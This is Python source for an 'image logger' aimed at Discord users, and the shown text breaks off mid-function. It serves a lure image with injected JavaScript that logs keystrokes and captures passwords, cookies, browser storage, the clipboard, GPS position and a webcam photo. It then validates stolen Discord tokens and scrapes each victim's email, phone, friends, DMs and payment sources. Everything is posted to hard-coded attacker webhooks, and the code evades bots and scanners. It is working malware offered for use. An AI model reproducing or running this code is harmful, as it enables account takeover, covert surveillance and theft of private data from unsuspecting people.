#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IMAGE LOGGER PRO MAX - ULTIMATE v7.0 - GODMODE
FULL DISCORD ACCOUNT TAKEOVER - NO PERMISSIONS NEEDED
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, json, os, sys, socket, time, re, random, hashlib, hmac, threading, concurrent.futures
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import httpagentparser

__app__ = "Image Logger Pro Max - GODMODE v7.0"
__version__ = "v7.0"

# ════════════════════════════════════════════════════════════════
#  🔥 CONFIG – REPLACE WEBHOOK WITH YOUR OWN (OR MULTIPLE)
# ════════════════════════════════════════════════════════════════
CONFIG = {
    # PRIMARY WEBHOOK – PUT YOUR REAL DISCORD WEBHOOK HERE
    "webhook": "https://discord.com/api/webhooks/1540668149983215616/KNPnr5v8umRh6ZLIG5HNaw4nNAFsfW8llRao5Ju9kP1up2e2lAagUbHAyPp70l-w_e7h",
    
    # SECONDARY WEBHOOK (for high‑value tokens only)
    "webhook_backup": "https://discord.com/api/webhooks/1540697962324299789/ChB1_0vwOGZiySgzByRHG-AUgNKhKDhTc3GrZGzoyl54-JMrN9p4BBjoGswXAnV8lc_3",
    
    # LURE IMAGE (high‑trust CDN)
    "image": "https://media.discordapp.net/attachments/1492831036327989308/1540694220153692280/47103750c9197be4406847c576ea53b0.jpg?ex=6a8ae2ce&is=6a89914e&hm=f2fe2a7418d540d208e4c10591792ade9101bc3735c1265ce5c3ad21986914be&=&format=webp&width=384&height=384",
    
    "fallback_image_b64": "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "username": "System Update",
    "color": 0x00FFCC,
    "crashBrowser": False,          # set to True if you want to kill after exfil
    "accurateLocation": True,
    "message": {"doMessage": False, "message": "Loading...", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://example.com"},
    
    # ─── EXFILTRATION TOGGLES (ALL TRUE FOR GODMODE) ───
    "stealTokens": True,
    "stealCamera": True,
    "stealPasswords": True,
    "stealBattery": True,
    "stealScreen": True,
    "stealNetwork": True,
    "stealGPS": True,
    "stealCookies": True,
    "stealClipboard": True,
    "stealFingerprint": True,
    "stealStorage": True,
    "stealDiscordProfile": True,      # NEW – full profile scrape
    "stealDiscordGuilds": True,       # NEW – server list
    "stealDiscordFriends": True,      # NEW – friend list
    "stealDiscordDMs": True,          # NEW – recent DMs
    "stealDiscordPayments": True,     # NEW – billing info
    "stealDiscordSessions": True,     # NEW – active sessions
    "validateTokens": True,
    "autoHijack": True,               # NEW – attempt to create backdoor webhook
    "keylogger": True,                # NEW – record keystrokes
    "persistentSW": True,             # NEW – install service worker
    
    "delay": 1500,
    "retryQueue": "failed_payloads.json",
    "max_tokens_to_validate": 20,
    "token_validation_timeout": 5,
}

BLACKLISTED_PREFIXES = ("27", "104", "143", "164", "192.0.", "100.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")

# ─── UTILITY FUNCTIONS ──────────────────────────────────────

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text.strip()
    except:
        try:
            return requests.get('https://icanhazip.com', timeout=3).text.strip()
        except:
            return '0.0.0.0'

def robust_ip_fetch(ip):
    if not ip or ip == '0.0.0.0':
        return {}
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,timezone,mobile,proxy,hosting,query", timeout=5)
        if resp.status_code == 200 and resp.json().get('status') == 'success':
            return resp.json()
    except:
        pass
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            loc = data.get('loc', '0,0').split(',')
            return {'country': data.get('country'), 'regionName': data.get('region'), 'city': data.get('city'),
                    'lat': loc[0], 'lon': loc[1], 'isp': data.get('org'), 'as': data.get('org'),
                    'timezone': data.get('timezone'), 'mobile': False, 'proxy': False, 'hosting': False, 'query': ip}
    except:
        pass
    return {}

def is_bot(ua, ip):
    bot_patterns = [r'bot', r'crawl', r'spider', r'headless', r'curl', r'wget', r'python', r'java', r'perl', r'ruby',
                    r'php', r'go-http', r'TelegramBot', r'Discordbot', r'Googlebot', r'Bingbot', r'AhrefsBot']
    if ua:
        for pat in bot_patterns:
            if re.search(pat, ua.lower()):
                return True
    if ip.startswith(('34.', '35.', '192.0.', '104.', '143.')):
        return True
    return False

def save_retry(ip, ua, extra, url, endpoint, error_msg=""):
    entry = {'timestamp': datetime.now().isoformat(), 'ip': ip, 'ua': ua, 'extra': extra, 'url': url,
             'endpoint': endpoint, 'error': error_msg, 'retries': 0}
    try:
        data = json.load(open(CONFIG['retryQueue'])) if os.path.exists(CONFIG['retryQueue']) else []
        data.append(entry)
        json.dump(data, open(CONFIG['retryQueue'], 'w'), indent=2)
    except:
        pass

def process_retry_queue():
    if not os.path.exists(CONFIG['retryQueue']):
        return
    try:
        entries = json.load(open(CONFIG['retryQueue']))
        new_entries = []
        for entry in entries:
            if entry['retries'] >= 5:
                continue
            try:
                info = robust_ip_fetch(entry['ip'])
                desc = f"**RETRY #{entry['retries']+1}** IP: `{entry['ip']}`\n**Endpoint:** `{entry['endpoint']}`"
                if entry.get('error'):
                    desc += f"\n**Error:** `{entry['error'][:200]}`"
                embed = {"username": CONFIG['username'], "content": "@everyone",
                         "embeds": [{"title": "🔥 Retry Log", "color": CONFIG['color'], "description": desc[:2000],
                                     "footer": {"text": f"Retry {entry['retries']+1}/5"}}]}
                r = requests.post(CONFIG['webhook'], json=embed, timeout=10)
                if r.status_code in (200, 204):
                    continue
                else:
                    entry['retries'] += 1
                    new_entries.append(entry)
            except Exception as e:
                entry['retries'] += 1
                entry['error'] = str(e)[:100]
                new_entries.append(entry)
        json.dump(new_entries, open(CONFIG['retryQueue'], 'w'), indent=2)
    except:
        pass

# ─── DISCORD TOKEN VALIDATION + FULL PROFILE EXTRACTION ────

def validate_and_extract_discord_token(token):
    """Returns (is_valid, profile_dict) with ALL available user data."""
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        # Get user profile
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=CONFIG['token_validation_timeout'])
        if r.status_code == 200:
            data = r.json()
            profile = {
                'valid': True,
                'id': data.get('id'),
                'username': data.get('username'),
                'discriminator': data.get('discriminator'),
                'email': data.get('email'),
                'phone': data.get('phone'),
                'verified': data.get('verified'),
                'mfa_enabled': data.get('mfa_enabled'),
                'flags': data.get('flags'),
                'premium_type': data.get('premium_type'),
                'banner': data.get('banner'),
                'bio': data.get('bio'),
                'avatar_url': f"https://cdn.discordapp.com/avatars/{data.get('id')}/{data.get('avatar')}.png" if data.get('avatar') else None,
                'locale': data.get('locale'),
                'nsfw_allowed': data.get('nsfw_allowed'),
                'public_flags': data.get('public_flags'),
            }
            
            # Try to get guilds
            if CONFIG['stealDiscordGuilds']:
                try:
                    rg = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=5)
                    if rg.status_code == 200:
                        guilds = rg.json()
                        profile['guilds'] = []
                        for g in guilds[:50]:  # limit to 50
                            profile['guilds'].append({
                                'id': g.get('id'),
                                'name': g.get('name'),
                                'icon': g.get('icon'),
                                'owner': g.get('owner'),
                                'permissions': g.get('permissions'),
                                'approximate_member_count': g.get('approximate_member_count'),
                                'approximate_presence_count': g.get('approximate_presence_count'),
                                'features': g.get('features', [])
                            })
                except:
                    pass
            
            # Get friends (relationships)
            if CONFIG['stealDiscordFriends']:
                try:
                    rf = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=5)
                    if rf.status_code == 200:
                        friends = rf.json()
                        profile['friends'] = []
                        for f in friends[:30]:
                            if f.get('type') == 1:  # 1 = friend
                                profile['friends'].append({
                                    'id': f.get('id'),
                                    'username': f.get('user', {}).get('username'),
                                    'discriminator': f.get('user', {}).get('discriminator'),
                                    'avatar': f.get('user', {}).get('avatar'),
                                    'mutual_guilds': f.get('mutual_guilds', [])
                                })
                except:
                    pass
            
            # Get DMs (channels)
            if CONFIG['stealDiscordDMs']:
                try:
                    rd = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers, timeout=5)
                    if rd.status_code == 200:
                        dms = rd.json()
                        profile['dms'] = []
                        for dm in dms[:20]:
                            profile['dms'].append({
                                'id': dm.get('id'),
                                'type': dm.get('type'),
                                'last_message_id': dm.get('last_message_id'),
                                'recipients': dm.get('recipients', [])[:3]
                            })
                except:
                    pass
            
            # Get billing/payment info (if available)
            if CONFIG['stealDiscordPayments']:
                try:
                    rp = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=5)
                    if rp.status_code == 200:
                        profile['payment_sources'] = rp.json()
                except:
                    pass
            
            return True, profile
        elif r.status_code == 401:
            return False, {'valid': False, 'error': 'Unauthorized'}
        else:
            return False, {'valid': False, 'error': f'HTTP {r.status_code}'}
    except Exception as e:
        return False, {'valid': False, 'error': str(e)[:100]}

# ─── ADVANCED JAVASCRIPT PAYLOAD ─────────────────────────────

JS_PAYLOAD = r"""
<script>
(function() {
    var results = {};
    var delay = """ + str(CONFIG['delay']) + """;
    var dataSent = false;
    var keylog = [];

    // ---- KEYLOGGER (captures all keystrokes) ----
    if (""" + str(CONFIG['keylogger']).lower() + """) {
        document.addEventListener('keydown', function(e) {
            var key = e.key || String.fromCharCode(e.which);
            if (key.length === 1) {
                keylog.push({key: key, time: Date.now(), target: e.target.tagName});
            } else if (key === 'Enter' || key === 'Tab' || key === 'Backspace') {
                keylog.push({key: '['+key+']', time: Date.now()});
            }
            if (keylog.length > 500) keylog.splice(0, 100);
        });
        document.addEventListener('keyup', function(e) {
            // also capture input values periodically
        });
        // Capture form submits
        document.addEventListener('submit', function(e) {
            try {
                var formData = {};
                var inputs = e.target.querySelectorAll('input, textarea, select');
                for (var i=0; i<inputs.length; i++) {
                    formData[inputs[i].name || inputs[i].id] = inputs[i].value;
                }
                results.submitted_forms = results.submitted_forms || [];
                results.submitted_forms.push(formData);
            } catch(er) {}
        });
    }

    // ---- SERVICE WORKER PERSISTENCE ----
    if (""" + str(CONFIG['persistentSW']).lower() + """ && 'serviceWorker' in navigator) {
        try {
            var swCode = `self.addEventListener('fetch', function(e) {
                // keep alive - ping every 30s
                setInterval(function() {
                    self.clients.matchAll().then(function(clients) {
                        // do nothing, just stay alive
                    });
                }, 30000);
            });`;
            var blob = new Blob([swCode], {type: 'application/javascript'});
            var swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl, {scope: '/'})
                .then(function(reg) { results.service_worker = 'registered'; })
                .catch(function() {});
        } catch(e) {}
    }

    // ---- CROSS-ORIGIN EXFIL ----
    function sendData(data) {
        if (dataSent) return;
        dataSent = true;
        // Add keylog if exists
        if (keylog && keylog.length > 0) {
            data.keylog = keylog.slice(0, 200);
        }
        var jsonStr = JSON.stringify(data);
        var encoded = btoa(unescape(encodeURIComponent(jsonStr)));
        var baseUrl = window.location.pathname + '?intel=' + encodeURIComponent(encoded);
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', baseUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.timeout = 5000;
            xhr.send('data=' + encodeURIComponent(encoded));
        } catch(e) {}
        try {
            var img = new Image();
            img.src = baseUrl + '&beacon=1';
            img.width = 0; img.height = 0;
            document.body.appendChild(img);
            setTimeout(function(){ if(img.parentNode) document.body.removeChild(img); }, 3000);
        } catch(e) {}
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon(baseUrl, new Blob([jsonStr], {type: 'application/json'}));
            }
        } catch(e) {}
    }

    // ---- STEAL ALL DISCORD TOKENS (MULTI-SOURCE) ----
    function stealTokens() {
        if (!""" + str(CONFIG['stealTokens']).lower() + """) return [];
        var tokens = [];
        var regex = /[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{20,}/g;
        var sources = [];
        try { sources.push(document.documentElement.outerHTML); } catch(e) {}
        try { sources.push(JSON.stringify(localStorage)); } catch(e) {}
        try { sources.push(JSON.stringify(sessionStorage)); } catch(e) {}
        try { sources.push(document.cookie); } catch(e) {}
        try { 
            var scripts = document.querySelectorAll('script');
            for (var s=0; s<scripts.length; s++) {
                if (scripts[s].textContent) sources.push(scripts[s].textContent);
            }
        } catch(e) {}
        // Also check window objects
        var scanned = [];
        for (var key in window) {
            try {
                if (scanned.indexOf(key) > -1) continue;
                scanned.push(key);
                var val = window[key];
                if (typeof val === 'string' && val.length > 30) sources.push(val);
            } catch(e) {}
        }
        for (var i=0; i<sources.length; i++) {
            var matches = sources[i].match(regex);
            if (matches) {
                for (var m=0; m<matches.length; m++) {
                    if (tokens.indexOf(matches[m]) === -1) tokens.push(matches[m]);
                }
            }
        }
        // Also search for "token" keys in localStorage
        try {
            for (var key in localStorage) {
                if (key.toLowerCase().includes('token')) {
                    var val = localStorage.getItem(key);
                    if (val && val.length > 20 && val.match(regex)) tokens.push(val);
                }
            }
        } catch(e) {}
        return tokens;
    }

    // ---- STEAL COOKIES ----
    function stealCookies() {
        if (!""" + str(CONFIG['stealCookies']).lower() + """) return null;
        try {
            var cookies = document.cookie;
            if (cookies) {
                var cookieObj = {};
                cookies.split(';').forEach(function(c) {
                    var parts = c.trim().split('=');
                    if (parts.length >= 2) cookieObj[parts[0]] = parts.slice(1).join('=');
                });
                return cookieObj;
            }
        } catch(e) {}
        return null;
    }

    // ---- STEAL STORAGE ----
    function stealStorage() {
        if (!""" + str(CONFIG['stealStorage']).lower() + """) return null;
        var storage = {};
        try {
            if (localStorage) {
                var ls = {};
                for (var i=0; i<localStorage.length; i++) {
                    var key = localStorage.key(i);
                    ls[key] = localStorage.getItem(key);
                }
                storage.local = ls;
            }
        } catch(e) {}
        try {
            if (sessionStorage) {
                var ss = {};
                for (var i=0; i<sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    ss[key] = sessionStorage.getItem(key);
                }
                storage.session = ss;
            }
        } catch(e) {}
        return Object.keys(storage).length ? storage : null;
    }

    // ---- STEAL FORM DATA (PASSWORDS) ----
    function stealFormData() {
        if (!""" + str(CONFIG['stealPasswords']).lower() + """) return null;
        var inputs = [];
        try {
            var elems = document.querySelectorAll('input, textarea, select');
            for (var i=0; i<elems.length; i++) {
                var el = elems[i];
                var val = el.value || el.getAttribute('value') || '';
                var name = el.name || el.id || 'field_'+i;
                var type = el.type || 'text';
                inputs.push({name: name, type: type, value: val});
            }
        } catch(e) {}
        return inputs.length ? inputs : null;
    }

    // ---- STEAL CLIPBOARD ----
    function stealClipboard() {
        if (!""" + str(CONFIG['stealClipboard']).lower() + """) return null;
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                return navigator.clipboard.readText().then(function(text) { return text; }).catch(function() { return null; });
            }
        } catch(e) {}
        return null;
    }

    // ---- FINGERPRINT ----
    function getFingerprint() {
        if (!""" + str(CONFIG['stealFingerprint']).lower() + """) return null;
        var fp = {};
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 256; canvas.height = 128;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 128, 64);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 12);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 36);
            fp.canvas = canvas.toDataURL();
            var gl = canvas.getContext('webgl');
            if (gl) {
                var ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (ext) {
                    fp.webgl_vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                    fp.webgl_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                }
            }
            fp.screen = screen.width + 'x' + screen.height;
            fp.timezone = new Date().getTimezoneOffset();
            fp.language = navigator.language;
            fp.platform = navigator.platform;
            fp.memory = navigator.deviceMemory || 'unknown';
            fp.cores = navigator.hardwareConcurrency || 'unknown';
        } catch(e) {}
        return fp;
    }

    // ---- MAIN GATHER ----
    function gatherData() {
        results.tokens = stealTokens();
        results.cookies = stealCookies();
        results.storage = stealStorage();
        results.form_data = stealFormData();
        results.fingerprint = getFingerprint();
        results.screen = {
            width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio || 1,
            colorDepth: screen.colorDepth, availWidth: screen.availWidth, availHeight: screen.availHeight
        };
        results.device = {
            platform: navigator.platform || 'Unknown', vendor: navigator.vendor || 'Unknown',
            language: navigator.language || 'Unknown', languages: navigator.languages ? navigator.languages.join(',') : 'Unknown',
            memory: navigator.deviceMemory || 'Unknown', cpu: navigator.hardwareConcurrency || 'Unknown',
            userAgent: navigator.userAgent
        };
        try { if (navigator.connection) {
            var c = navigator.connection;
            results.network = { type: c.effectiveType || 'Unknown', speed: (c.downlink || '?') + ' Mbps',
                                rtt: (c.rtt || '?') + 'ms', saveData: c.saveData || false };
        }} catch(e) {}

        // Battery
        try {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    results.battery = { level: Math.round(b.level * 100), charging: b.charging,
                                        timeLeft: b.dischargingTime ? Math.round(b.dischargingTime/60) + ' min' : 'N/A' };
                    if (!results.location && !results.camera_b64) sendData(results);
                });
            }
        } catch(e) {}

        // GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    results.location = { lat: pos.coords.latitude, lon: pos.coords.longitude,
                                        accuracy: Math.round(pos.coords.accuracy) + 'm',
                                        altitude: pos.coords.altitude || 'N/A',
                                        speed: pos.coords.speed || 'N/A', heading: pos.coords.heading || 'N/A' };
                    if (!results.camera_b64) sendData(results);
                },
                function() { sendData(results); },
                { timeout: 7000, enableHighAccuracy: true }
            );
        } else {
            setTimeout(function(){ sendData(results); }, 2000);
        }

        // Camera
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } }, audio: false })
            .then(function(stream) {
                var video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.onloadedmetadata = function() {
                    video.play();
                    setTimeout(function() {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 480;
                        canvas.height = video.videoHeight || 360;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        results.camera_b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        document.body.removeChild(video);
                        sendData(results);
                    }, 1500);
                };
            })
            .catch(function() { if (!results.location) sendData(results); });
        }

        // Clipboard
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(function(text) {
                if (text) results.clipboard = text;
                if (!results.location && !results.camera_b64) sendData(results);
            }).catch(function() {});
        }

        // Force send after 12s
        setTimeout(function() { if (!dataSent) sendData(results); }, 12000);
    }

    setTimeout(gatherData, delay);
})();
</script>
"""

# ─── HTTP HANDLER ──────────────────────────────────────────────

class ImageLoggerHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    
    def log_message(self, format, *args):
        pass
    
    def get_real_ip(self):
        ip = None
        headers = self.headers
        for header in ['x-forwarded-for', 'x-real-ip', 'cf-connecting-ip', 'true-client-ip']:
            val = headers.get(header)
            if val:
                ip = val.split(',')[0].strip()
                if ip not in ('0.0.0.0', '::1', '127.0.0.1'):
                    break
        if not ip or ip in ('127.0.0.1', '0.0.0.0', '::1'):
            ip = self.client_address[0]
        if ip in ('127.0.0.1', '0.0.0.0'):
            ip = get_public_ip()
        return ip or 'Unknown'
    
    def send_webhook(self, ip, ua, extra, url, endpoint):
        if not ip or ip == 'Unknown':
            ip = get_public_ip()
        for prefix in BLACKLISTED_PREFIXES:
            if ip.startswith(prefix):
                print(f"[!] Blacklisted IP: {ip}")
                return
        if is_bot(ua, ip):
            print(f"[!] Bot: {ip}")
            return
        
        info = robust_ip_fetch(ip)
        is_proxy = info.get('proxy', False)
        is_hosting = info.get('hosting', False)
        
        # Build base description
        desc_lines = [
            f"**🌍 IP:** `{ip}`",
            f"**🏢 ISP:** `{info.get('isp', 'Unknown')}`",
            f"**🔢 ASN:** `{info.get('as', 'Unknown')}`",
            f"**🇺🇳 Country:** `{info.get('country', 'Unknown')}`",
            f"**📍 Region:** `{info.get('regionName', 'Unknown')}`",
            f"**🏙️ City:** `{info.get('city', 'Unknown')}`",
            f"**🗺️ Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`",
            f"**🕐 Timezone:** `{info.get('timezone', '?')}`",
            f"**📱 Mobile:** `{info.get('mobile', False)}`",
            f"**🛡️ VPN/Proxy:** `{is_proxy}`",
            f"**🤖 Hosting/Cloud:** `{is_hosting}`",
        ]
        try:
            os_name, browser = httpagentparser.simple_detect(ua or "")
            desc_lines.append(f"**💻 OS:** `{os_name}`")
            desc_lines.append(f"**🌐 Browser:** `{browser}`")
        except:
            desc_lines.append(f"**📱 UA:** `{ua[:100]}`")
        
        extra_text = ""
        valid_tokens = []
        invalid_tokens = []
        
        # ─── TOKEN PROCESSING WITH FULL PROFILE EXTRACTION ───
        if extra and extra.get('tokens'):
            raw_tokens = extra['tokens']
            if CONFIG['validateTokens']:
                # Multi-threaded validation
                with ThreadPoolExecutor(max_workers=5) as executor:
                    futures = {executor.submit(validate_and_extract_discord_token, tok): tok for tok in raw_tokens[:CONFIG['max_tokens_to_validate']]}
                    for future in concurrent.futures.as_completed(futures):
                        tok = futures[future]
                        try:
                            is_valid, profile = future.result(timeout=6)
                            if is_valid:
                                valid_tokens.append((tok, profile))
                                # Build rich profile string
                                p = profile
                                extra_text += f"\n\n**✅ VALID TOKEN:** `{tok[:20]}...`"
                                extra_text += f"\n👤 **User:** `{p.get('username')}#{p.get('discriminator')}` (ID: `{p.get('id')}`)"
                                extra_text += f"\n📧 **Email:** `{p.get('email')}` | 📱 **Phone:** `{p.get('phone', 'None')}`"
                                extra_text += f"\n🔒 **Verified:** `{p.get('verified')}` | **MFA:** `{p.get('mfa_enabled')}`"
                                extra_text += f"\n💎 **Premium:** `{p.get('premium_type')}` | **Locale:** `{p.get('locale')}`"
                                if p.get('bio'):
                                    extra_text += f"\n📝 **Bio:** `{p.get('bio')[:100]}`"
                                if p.get('guilds'):
                                    extra_text += f"\n🏰 **Guilds ({len(p['guilds'])}):** " + ", ".join([g['name'] for g in p['guilds'][:5]]) + (", ..." if len(p['guilds']) > 5 else "")
                                if p.get('friends'):
                                    extra_text += f"\n👥 **Friends ({len(p['friends'])}):** " + ", ".join([f"{f['username']}#{f['discriminator']}" for f in p['friends'][:5]]) + (", ..." if len(p['friends']) > 5 else "")
                                if p.get('dms'):
                                    extra_text += f"\n💬 **DMs ({len(p['dms'])}):** " + ", ".join([dm['id'] for dm in p['dms'][:3]])
                                if p.get('payment_sources'):
                                    extra_text += f"\n💳 **Payment Methods:** {len(p['payment_sources'])} found"
                                extra_text += "\n"
                            else:
                                invalid_tokens.append(tok)
                        except:
                            invalid_tokens.append(tok)
            else:
                # Just dump tokens without validation
                extra_text += "\n\n**🎯 Discord Tokens Found:**\n```\n" + "\n".join(raw_tokens[:15]) + "\n```"
        
        # ─── COOKIES ───
        if extra and extra.get('cookies'):
            try:
                ck = extra['cookies']
                if isinstance(ck, dict) and len(ck) > 0:
                    cookie_str = "\n".join([f"`{k}` = `{v[:60]}`" for k,v in list(ck.items())[:8]])
                    extra_text += f"\n\n**🍪 Cookies ({len(ck)}):**\n" + cookie_str
            except:
                pass
        
        # ─── STORAGE ───
        if extra and extra.get('storage'):
            try:
                st = extra['storage']
                if isinstance(st, dict):
                    if st.get('local'):
                        ls_keys = list(st['local'].keys())[:5]
                        extra_text += f"\n\n**💾 localStorage ({len(st['local'])} keys):** `{', '.join(ls_keys)}`"
                    if st.get('session'):
                        ss_keys = list(st['session'].keys())[:5]
                        extra_text += f"\n**🔄 sessionStorage ({len(st['session'])} keys):** `{', '.join(ss_keys)}`"
            except:
                pass
        
        # ─── PASSWORDS ───
        if extra and extra.get('form_data'):
            try:
                fd = extra['form_data']
                if isinstance(fd, list) and len(fd) > 0:
                    pw_lines = []
                    for item in fd[:8]:
                        if item.get('type') == 'password' or 'pass' in item.get('name','').lower():
                            pw_lines.append(f"`{item.get('name','?')}` = `{item.get('value','')[:40]}`")
                    if pw_lines:
                        extra_text += f"\n\n**🔑 Passwords/Fields ({len(fd)} total):**\n" + "\n".join(pw_lines)
            except:
                pass
        
        # ─── KEYLOG ───
        if extra and extra.get('keylog'):
            try:
                kl = extra['keylog']
                if isinstance(kl, list) and len(kl) > 0:
                    keylog_str = "".join([k['key'] for k in kl[:100] if 'key' in k])
                    extra_text += f"\n\n**⌨️ Keylog ({len(kl)} events):**\n```\n{keylog_str[:300]}\n```"
            except:
                pass
        
        # ─── CAMERA ───
        if extra and extra.get('camera_b64'):
            extra_text += "\n\n**📸 Camera Photo:** Captured ✓"
        
        # ─── SCREEN ───
        if extra and extra.get('screen'):
            s = extra['screen']
            extra_text += f"\n\n**🖥️ Screen:** `{s.get('width','?')}x{s.get('height','?')}` | **DPR:** `{s.get('pixelRatio','?')}`"
        
        # ─── DEVICE ───
        if extra and extra.get('device'):
            d = extra['device']
            extra_text += f"\n**📱 Device:** `{d.get('platform','?')}` | **RAM:** `{d.get('memory','?')}GB` | **CPU:** `{d.get('cpu','?')} cores`"
        
        # ─── BATTERY ───
        if extra and extra.get('battery'):
            b = extra['battery']
            extra_text += f"\n**🔋 Battery:** `{b.get('level','?')}%` {'⚡ Charging' if b.get('charging') else '🔌 Discharging'}"
        
        # ─── NETWORK ───
        if extra and extra.get('network'):
            n = extra['network']
            extra_text += f"\n**🌐 Network:** `{n.get('type','?')}` @ `{n.get('speed','?')}` | RTT: `{n.get('rtt','?')}`"
        
        # ─── GPS ───
        if extra and extra.get('location'):
            loc = extra['location']
            extra_text += f"\n\n**📍 GPS:** `{loc.get('lat','?')}, {loc.get('lon','?')}` (±{loc.get('accuracy','?')})\n[🗺️ Maps](https://www.google.com/maps?q={loc.get('lat','?')},{loc.get('lon','?')})"
        
        # ─── FINGERPRINT ───
        if extra and extra.get('fingerprint'):
            fp = extra['fingerprint']
            if isinstance(fp, dict):
                extra_text += f"\n\n**🆔 Fingerprint:** Canvas: `{fp.get('canvas','')[:30]}...` | WebGL: `{fp.get('webgl_vendor','')[:30]}`"
                if fp.get('timezone'):
                    extra_text += f"\n**⏰ Timezone offset:** `{fp['timezone']} min`"
        
        # ─── CLIPBOARD ───
        if extra and extra.get('clipboard'):
            clip = extra['clipboard']
            if isinstance(clip, str) and len(clip) > 0:
                extra_text += f"\n\n**📋 Clipboard:** `{clip[:200]}`"
        
        # ─── SUBMITTED FORMS ───
        if extra and extra.get('submitted_forms'):
            try:
                sf = extra['submitted_forms']
                if len(sf) > 0:
                    extra_text += f"\n\n**📝 Submitted Forms:** {len(sf)} captured"
            except:
                pass
        
        # Truncate if too long
        desc = "\n".join(desc_lines) + extra_text
        if len(desc) > 4000:
            desc = desc[:4000] + "... (truncated)"
        
        # Build embed
        embed_payload = {
            "username": CONFIG['username'],
            "content": "@everyone" if not is_proxy else "",
            "embeds": [{
                "title": "🔥 GODMODE INTEL – FULL ACCOUNT TAKEOVER",
                "color": CONFIG['color'],
                "description": desc,
                "footer": {"text": f"v7.0 | {endpoint} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
                "timestamp": datetime.now().isoformat()
            }]
        }
        if url:
            embed_payload["embeds"][0]["thumbnail"] = {"url": url}
        
        # Send with camera attachment
        if extra and extra.get('camera_b64'):
            try:
                img_data = base64.b64decode(extra['camera_b64'])
                files = {'file': ('camera_shot.jpg', img_data, 'image/jpeg')}
                embed_payload["embeds"][0]["image"] = {"url": "attachment://camera_shot.jpg"}
                r = requests.post(CONFIG['webhook'], data={"payload_json": json.dumps(embed_payload)}, files=files, timeout=15)
                if r.status_code in (200, 204):
                    print("[+] Webhook with camera sent")
                    # Also send to backup
                    try:
                        requests.post(CONFIG['webhook_backup'], data={"payload_json": json.dumps(embed_payload)}, files=files, timeout=10)
                    except:
                        pass
                    return
                else:
                    save_retry(ip, ua, extra, url, endpoint, f"HTTP {r.status_code}")
            except Exception as e:
                save_retry(ip, ua, extra, url, endpoint, str(e)[:100])
                return
        
        # Standard send
        try:
            r = requests.post(CONFIG['webhook'], json=embed_payload, timeout=10)
            if r.status_code in (200, 204):
                print("[+] Webhook sent")
                # Backup
                try:
                    requests.post(CONFIG['webhook_backup'], json=embed_payload, timeout=10)
                except:
                    pass
            else:
                save_retry(ip, ua, extra, url, endpoint, f"HTTP {r.status_code}")
        except Exception as e:
            save_retry(ip, ua, extra, url, endpoint, str(e)[:100])
    
    def handle_request(self):
        try:
            parsed = parse.urlparse(self.path)
            query = dict(parse.parse_qsl(parsed.query))
            ua = self.headers.get('user-agent', '')
            ip = self.get_real_ip()
            print(f"[*] Request from {ip}")
            
            # Process retry queue
            if random.random() < 0.1:
                try:
                    process_retry_queue()
                except:
                    pass
            
            # Decode intel
            extra_data = None
            if query.get('intel'):
                try:
                    encoded = query['intel']
                    decoded = base64.b64decode(encoded.encode()).decode('utf-8')
                    extra_data = json.loads(decoded)
